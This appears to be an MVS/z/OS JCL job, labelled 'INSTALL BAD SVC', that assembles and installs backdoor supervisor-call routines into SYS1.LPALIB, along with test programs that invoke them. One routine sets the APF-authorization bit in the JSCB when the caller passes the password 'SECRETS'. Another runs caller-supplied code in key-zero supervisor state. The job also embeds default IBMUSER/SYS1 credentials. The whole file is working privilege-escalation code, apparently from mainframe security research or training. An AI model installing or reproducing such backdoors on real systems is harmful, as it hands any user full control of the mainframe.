//BAD2SVC   JOB (SVC),
//             'INSTALL BAD SVC',
//             CLASS=A,
//             MSGCLASS=A,
//             MSGLEVEL=(2,1),
//             REGION=0K,
//             USER=IBMUSER,
//             PASSWORD=SYS1
//ASMLKD1 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
LEETSVC  CSECT
***********************************************************************
*    INITIALIZATION
***********************************************************************
         BALR  R12,0
         USING *,R12
         STM   R14,R12,SAVE
***********************************************************************
*    MAINSTREAM OF PROGRAM
***********************************************************************
         CLC   SECRET,0(R1)
         BNE   NOSECRET
         L     R2,540              POINTER TO TCB
         L     R2,180(R2)           POINTER TO JSCB
         OI    236(R2),X'01'       JSCBOPTS
         WTO   'GOD MODE ACTIVATED'
         B     ENDPROG
NOSECRET WTO   'GET OUT OF HERE'
***********************************************************************
*    END OF PROGRAM
***********************************************************************
ENDPROG  LM    R14,R12,SAVE
         XR    R15,R15
         BR    R14
***********************************************************************
*    DATA
***********************************************************************
SECRET   DC    C'SECRETS'
SAVE     DS    18F
***********************************************************************
*    MACROS
***********************************************************************
         YREGS
         END   LEETSVC CSECT
@@
//LKED.SYSLMOD  DD DSN=SYS1.LPALIB(IGC0024A),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//ASMLKD2 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
REGSAV   CSECT
***********************************************************************
*    INITIALIZATION
***********************************************************************
         BALR  R12,0
         USING *,R12
         STM   R14,R12,0(R13)
***********************************************************************
*    MAINSTREAM OF PROGRAM
***********************************************************************
         WTO   'My heart is human'
         WTO   'My blood is boiling'
         WTO   'My brain I.B.M'
***********************************************************************
*    END OF PROGRAM
***********************************************************************
ENDPROG  LM    R14,R12,0(R13)
         XR    R15,R15
         BR    R14
***********************************************************************
*    DATA
***********************************************************************
***********************************************************************
*    MACROS
***********************************************************************
         YREGS
         END   REGSAV CSECT
@@
//LKED.SYSLMOD  DD DSN=SYS1.LPALIB(IGC0024B),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//ASMLKD1 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
JUMPSVC  CSECT
***********************************************************************
*    INITIALIZATION
***********************************************************************
         BALR  R12,0
         USING *,R12
         STM   R14,R12,SAVE
***********************************************************************
*    MAINSTREAM OF PROGRAM
***********************************************************************
         L     R2,0(R1)
         MODESET KEY=ZERO,MODE=SUP
         BALR  R14,R2
***********************************************************************
*    END OF PROGRAM
***********************************************************************
ENDPROG  LM    R14,R12,SAVE
         XR    R15,R15
         BR    R14
***********************************************************************
*    DATA
***********************************************************************
SAVE     DS    18F
***********************************************************************
*    MACROS
***********************************************************************
         YREGS
         END   JUMPSVC CSECT
@@
//LKED.SYSLMOD  DD DSN=SYS1.LPALIB(IGC0024C),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//ASMLKD2 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
RUNSVC   CSECT
***********************************************************************
*    INITIALIZATION
***********************************************************************
         BALR  R12,0
         USING *,R12
         STM   R14,R12,SAVE
***********************************************************************
*    MAINSTREAM OF PROGRAM
***********************************************************************
         LA    R1,SECRET
         SVC   241
         MODESET KEY=ZERO,MODE=SUP
***********************************************************************
*    END OF PROGRAM
***********************************************************************
ENDPROG  LM    R14,R12,SAVE
         XR    R15,R15
         BR    R14
***********************************************************************
*    DATA
***********************************************************************
SECRET   DC    C'SECRETS'
SAVE     DS    18F
***********************************************************************
*    MACROS
***********************************************************************
         YREGS
         END   RUNSVC CSECT
@@
//LKED.SYSLMOD  DD DSN=SYS2.LINKLIB(RUNSVC41),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//ASMLKD2 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
RUNSVC   CSECT
***********************************************************************
*    INITIALIZATION
***********************************************************************
         BALR  R12,0
         USING *,R12
         STM   R14,R12,SAVE
***********************************************************************
*    MAINSTREAM OF PROGRAM
***********************************************************************
         L     R13,540              POINTER TO TCB
         L     R13,180(R13)         POINTER TO JSCB
         LA    R13,235(R13)         JSCBOPTS
         SVC   242
         MODESET KEY=ZERO,MODE=SUP
***********************************************************************
*    END OF PROGRAM
***********************************************************************
ENDPROG  LM    R14,R12,SAVE
         XR    R15,R15
         BR    R14
***********************************************************************
*    DATA
***********************************************************************
SAVE     DS    18F
***********************************************************************
*    MACROS
***********************************************************************
         YREGS
         END   RUNSVC CSECT
@@
//LKED.SYSLMOD  DD DSN=SYS2.LINKLIB(RUNSVC42),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//ASMLKD2 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
RUNSVC   CSECT
***********************************************************************
*    INITIALIZATION
***********************************************************************
         BALR  R12,0
         USING *,R12
         STM   R14,R12,SAVE
***********************************************************************
*    MAINSTREAM OF PROGRAM
***********************************************************************
         LA    R2,JUMPHERE
         ST    R2,MODESETA
         LA    R1,MODESETA
         SVC   243
JUMPHERE LA    R1,60
         SVC   107
         DC    XL4'DEADBEEF'
***********************************************************************
*    DATA
***********************************************************************
         DS    0F
MODESETA DS    XL4
SAVE     DS    18F
***********************************************************************
*    MACROS
***********************************************************************
         YREGS
         END   RUNSVC CSECT
@@
//LKED.SYSLMOD  DD DSN=SYS2.LINKLIB(RUNSVC43),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//*RUNSVC41 EXEC PGM=RUNSVC41
//*SYSPRINT DD   SYSOUT=A
//*STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
//*RUNSVC42 EXEC PGM=RUNSVC42
//*SYSPRINT DD   SYSOUT=A
//*STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
//RUNSVC43 EXEC PGM=RUNSVC43
//SYSPRINT DD   SYSOUT=A
//STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
//SYSUDUMP DD   SYSOUT=A